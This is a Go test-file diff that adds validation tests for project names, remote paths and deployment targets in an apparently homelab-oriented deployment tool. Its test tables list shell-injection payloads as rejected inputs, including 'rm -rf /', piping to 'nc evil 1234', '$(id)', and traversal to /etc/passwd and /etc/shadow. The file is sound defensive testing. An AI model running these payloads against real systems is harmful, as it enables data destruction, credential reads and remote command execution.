@@ -1,6 +1,7 @@
 package reconcile
 
 import (
+	"fmt"
 	"testing"
 
 	"github.com/stretchr/testify/assert"
@@ -253,4 +254,258 @@ func TestValidationIntegration(t *testing.T) {
 			assert.Error(t, validateContainerName(attack), "container should reject: %s", attack)
 		}
 	})
+}
+
+func TestValidateProjectName(t *testing.T) {
+	tests := []struct {
+		name        string
+		projectName string
+		wantErr     bool
+		errMsg      string
+	}{
+		// Valid project names
+		{"simple", "myproject", false, ""},
+		{"with hyphen", "my-project", false, ""},
+		{"with underscore", "my_project", false, ""},
+		{"with dot", "my.project", false, ""},
+		{"with numbers", "project123", false, ""},
+		{"starts with digit", "1project", false, ""},
+		{"mixed", "bosun-v2.0_prod", false, ""},
+
+		// Invalid: empty
+		{"empty", "", true, "cannot be empty"},
+
+		// Invalid: starts with dash (option injection)
+		{"starts with dash", "-project", true, "cannot start with '-'"},
+
+		// Shell metacharacter corpus (one test per metachar)
+		{"semicolon", "a;touch /tmp/bosun_pwn", true, "shell metacharacter"},
+		{"ampersand", "a&& rm -rf /", true, "shell metacharacter"},
+		{"pipe", "a | nc evil 1234", true, "shell metacharacter"},
+		{"dollar subshell", "a$(touch /tmp/pwn)", true, "shell metacharacter"},
+		{"backtick subshell", "a`touch /tmp/pwn`", true, "shell metacharacter"},
+		{"open paren", "a(", true, "shell metacharacter"},
+		{"close paren", "a)", true, "shell metacharacter"},
+		{"open brace", "a{", true, "shell metacharacter"},
+		{"close brace", "a}", true, "shell metacharacter"},
+		{"less than", "a<file", true, "shell metacharacter"},
+		{"greater than", "a>file", true, "shell metacharacter"},
+		{"backslash", "a\\b", true, "shell metacharacter"},
+		{"newline", "a\nb", true, "shell metacharacter"},
+		{"carriage return", "a\rb", true, "shell metacharacter"},
+		{"single quote", "a'b'", true, "shell metacharacter"},
+		{"double quote", "a\"b\"", true, "shell metacharacter"},
+
+		// Known attack payloads
+		{"command injection semicolon", "a;touch /tmp/bosun_pwn", true, "shell metacharacter"},
+		{"command injection subshell dollar", "a$(touch /tmp/pwn)", true, "shell metacharacter"},
+		{"command injection backtick", "a`touch /tmp/pwn`", true, "shell metacharacter"},
+		{"command injection and", "a && rm -rf /", true, "shell metacharacter"},
+		{"command injection pipe nc", "a | nc evil 1234", true, "shell metacharacter"},
+
+		// Invalid: bad format
+		{"space in name", "my project", true, "invalid project name format"},
+		{"starts with dot", ".project", true, "invalid project name format"},
+		{"at sign", "project@host", true, "invalid project name format"},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := ValidateProjectName(tt.projectName)
+			if tt.wantErr {
+				require.Error(t, err)
+				assert.Contains(t, err.Error(), tt.errMsg)
+			} else {
+				require.NoError(t, err)
+			}
+		})
+	}
+}
+
+func TestValidateRemotePath(t *testing.T) {
+	tests := []struct {
+		name    string
+		path    string
+		wantErr bool
+		errMsg  string
+	}{
+		// Valid paths
+		{"absolute path", "/mnt/appdata", false, ""},
+		{"absolute with subdir", "/mnt/user/appdata", false, ""},
+		{"relative simple", "appdata/service", false, ""},
+		{"with hyphen", "/mnt/app-data", false, ""},
+		{"with underscore", "/mnt/app_data", false, ""},
+		{"with dot", "/mnt/app.data", false, ""},
+
+		// Valid: spaces are allowed for Unraid NAS paths
+		{"space in path (Unraid)", "/mnt/user/My Media/appdata", false, ""},
+		{"space in subdir", "/mnt/user/My Files/docker", false, ""},
+
+		// Invalid: empty
+		{"empty", "", true, "cannot be empty"},
+
+		// Invalid: starts with "-" (CLI flag injection)
+		{"-starts with dash", "-mybadpath", true, "cannot start with '-'"},
+		{"dash only", "-", true, "cannot start with '-'"},
+
+		// Invalid: path traversal
+		{"path traversal", "/mnt/../etc/passwd", true, "path traversal"},
+		{"relative traversal", "../../etc/shadow", true, "path traversal"},
+		{"embedded traversal", "/valid/../../../etc/passwd", true, "path traversal"},
+
+		// Shell metacharacter corpus
+		{"semicolon", "/mnt;rm -rf /", true, "shell metacharacter"},
+		{"ampersand", "/mnt&whoami", true, "shell metacharacter"},
+		{"pipe", "/mnt|cat /etc/passwd", true, "shell metacharacter"},
+		{"dollar subshell", "/mnt$(id)", true, "shell metacharacter"},
+		{"backtick", "/mnt`id`", true, "shell metacharacter"},
+		{"single quote", "/mnt'evil'", true, "shell metacharacter"},
+		{"double quote", "/mnt\"evil\"", true, "shell metacharacter"},
+		{"newline", "/mnt\nid", true, "shell metacharacter"},
+		{"backslash", "/mnt\\evil", true, "shell metacharacter"},
+
+		// Invalid: special chars rejected by regex
+		{"at sign", "/mnt/@data", true, "invalid remote path format"},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := ValidateRemotePath(tt.path)
+			if tt.wantErr {
+				require.Error(t, err)
+				assert.Contains(t, err.Error(), tt.errMsg)
+			} else {
+				require.NoError(t, err)
+			}
+		})
+	}
+}
+
+func TestValidateAndSanitizeTargets(t *testing.T) {
+	t.Run("clean targets are preserved unchanged", func(t *testing.T) {
+		targets := []Target{
+			{Name: "unraid", TargetHost: "user@unraid", ProjectName: "homelab", RemoteAppdataPath: "/mnt/user/appdata"},
+			{Name: "pi", TargetHost: "user@pi", ProjectName: "pistack", RemoteAppdataPath: "/home/pi/appdata"},
+		}
+		got := ValidateAndSanitizeTargets(targets, nil)
+		require.Len(t, got, 2)
+		assert.Equal(t, "homelab", got[0].ProjectName)
+		assert.Equal(t, "/mnt/user/appdata", got[0].RemoteAppdataPath)
+		assert.Equal(t, "pistack", got[1].ProjectName)
+		assert.Equal(t, "/home/pi/appdata", got[1].RemoteAppdataPath)
+	})
+
+	t.Run("empty project_name is left empty (no validation)", func(t *testing.T) {
+		targets := []Target{
+			{Name: "t1", TargetHost: "user@host"},
+		}
+		got := ValidateAndSanitizeTargets(targets, nil)
+		require.Len(t, got, 1)
+		assert.Equal(t, "", got[0].ProjectName)
+		assert.Equal(t, "", got[0].RemoteAppdataPath)
+	})
+
+	t.Run("invalid project_name is cleared and warn is called", func(t *testing.T) {
+		var warnedTarget, warnedField string
+		var warnedErr error
+		targets := []Target{
+			{Name: "evil", TargetHost: "user@host", ProjectName: "evil; rm -rf /", RemoteAppdataPath: "/mnt/appdata"},
+		}
+		got := ValidateAndSanitizeTargets(targets, func(target, field string, err error) {
+			warnedTarget = target
+			warnedField = field
+			warnedErr = err
+		})
+		require.Len(t, got, 1)
+		assert.Equal(t, "", got[0].ProjectName, "invalid project_name must be cleared")
+		assert.Equal(t, "/mnt/appdata", got[0].RemoteAppdataPath, "valid remote_appdata_path must be preserved")
+		assert.Equal(t, "evil", warnedTarget)
+		assert.Equal(t, "project_name", warnedField)
+		assert.Error(t, warnedErr)
+	})
+
+	t.Run("invalid remote_appdata_path is cleared and warn is called", func(t *testing.T) {
+		var warnedTarget, warnedField string
+		var warnedErr error
+		targets := []Target{
+			{Name: "badpath", TargetHost: "user@host", ProjectName: "myproject", RemoteAppdataPath: "/mnt;rm -rf /"},
+		}
+		got := ValidateAndSanitizeTargets(targets, func(target, field string, err error) {
+			warnedTarget = target
+			warnedField = field
+			warnedErr = err
+		})
+		require.Len(t, got, 1)
+		assert.Equal(t, "myproject", got[0].ProjectName, "valid project_name must be preserved")
+		assert.Equal(t, "", got[0].RemoteAppdataPath, "invalid remote_appdata_path must be cleared")
+		assert.Equal(t, "badpath", warnedTarget)
+		assert.Equal(t, "remote_appdata_path", warnedField)
+		assert.Error(t, warnedErr)
+	})
+
+	t.Run("multiple invalid fields on one target — each is independently cleared", func(t *testing.T) {
+		var warns []string
+		targets := []Target{
+			{Name: "double-bad", TargetHost: "user@host", ProjectName: "bad name", RemoteAppdataPath: "/mnt;evil"},
+		}
+		got := ValidateAndSanitizeTargets(targets, func(target, field string, err error) {
+			warns = append(warns, field)
+		})
+		require.Len(t, got, 1)
+		assert.Equal(t, "", got[0].ProjectName)
+		assert.Equal(t, "", got[0].RemoteAppdataPath)
+		assert.Contains(t, warns, "project_name")
+		assert.Contains(t, warns, "remote_appdata_path")
+	})
+
+	t.Run("multiple entries — only bad entries are cleared, others preserved", func(t *testing.T) {
+		var warnCount int
+		targets := []Target{
+			{Name: "good", TargetHost: "user@host", ProjectName: "myproject", RemoteAppdataPath: "/mnt/appdata"},
+			{Name: "bad", TargetHost: "user@host2", ProjectName: "evil$(id)", RemoteAppdataPath: "/mnt/appdata"},
+		}
+		got := ValidateAndSanitizeTargets(targets, func(target, field string, err error) {
+			warnCount++
+		})
+		require.Len(t, got, 2)
+		assert.Equal(t, "myproject", got[0].ProjectName, "clean target's project_name must be untouched")
+		assert.Equal(t, "/mnt/appdata", got[0].RemoteAppdataPath)
+		assert.Equal(t, "", got[1].ProjectName, "injected project_name must be cleared")
+		assert.Equal(t, 1, warnCount)
+	})
+
+	t.Run("empty slice is a no-op", func(t *testing.T) {
+		got := ValidateAndSanitizeTargets(nil, nil)
+		assert.Len(t, got, 0)
+
+		got = ValidateAndSanitizeTargets([]Target{}, nil)
+		assert.Len(t, got, 0)
+	})
+
+	t.Run("original slice is not mutated", func(t *testing.T) {
+		original := []Target{
+			{Name: "t1", ProjectName: "evil;cmd", RemoteAppdataPath: "/mnt/appdata"},
+		}
+		originalProjectName := original[0].ProjectName
+		_ = ValidateAndSanitizeTargets(original, nil)
+		assert.Equal(t, originalProjectName, original[0].ProjectName, "original slice must not be mutated")
+	})
+}
+
+// TestShellMetacharsCorpus verifies that every character in the shellMetachars
+// slice is rejected by both ValidateProjectName and ValidateRemotePath.
+func TestShellMetacharsCorpus(t *testing.T) {
+	for _, char := range shellMetachars {
+		char := char // capture
+		t.Run("projectName/"+fmt.Sprintf("%q", char), func(t *testing.T) {
+			name := "safe" + char + "name"
+			err := ValidateProjectName(name)
+			require.Error(t, err, "ValidateProjectName should reject metachar %q", char)
+		})
+		t.Run("remotePath/"+fmt.Sprintf("%q", char), func(t *testing.T) {
+			path := "/mnt" + char + "evil"
+			err := ValidateRemotePath(path)
+			require.Error(t, err, "ValidateRemotePath should reject metachar %q", char)
+		})
+	}
 }
